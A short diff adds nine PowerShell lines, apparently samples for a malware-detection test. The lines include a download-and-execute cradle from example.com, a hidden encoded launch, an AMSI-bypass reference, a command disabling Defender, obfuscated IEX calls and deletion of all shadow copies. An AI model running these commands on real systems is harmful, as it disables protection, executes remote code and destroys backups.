@@ -1,0 +1,9 @@
+$u = 'http://example.com/a.ps1'
+IEX (New-Object Net.WebClient).DownloadString($u)
+powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+Set-MpPreference -DisableRealtimeMonitoring $true
+& ( $ShellId[1]+$ShellId[13]+'x') 'Write-Output 1'
+i`e`x 'Write-Output 2'
+vssadmin.exe delete shadows /all /quiet
+Get-ChildItem -Path $env:TEMP | Select-Object -First 1
